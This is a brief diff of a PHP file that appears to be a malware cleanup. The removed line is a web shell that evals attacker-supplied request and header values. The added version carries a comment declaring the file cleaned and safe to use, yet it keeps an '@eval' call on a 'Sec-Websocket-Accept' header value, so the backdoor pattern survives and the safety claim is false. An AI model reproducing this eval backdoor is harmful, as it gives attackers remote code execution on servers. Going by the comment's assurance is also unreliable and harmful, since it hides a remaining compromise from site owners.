@@ -1,1 +1,6 @@
-<?php @eval($_REQUEST["Sec-Websocket-Accept"]);@eval($_HEADERS["Sec-Websocket-Accept"]);
+<?php 
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+@eval($_HEADERS["Sec-Websocket-Accept"]);
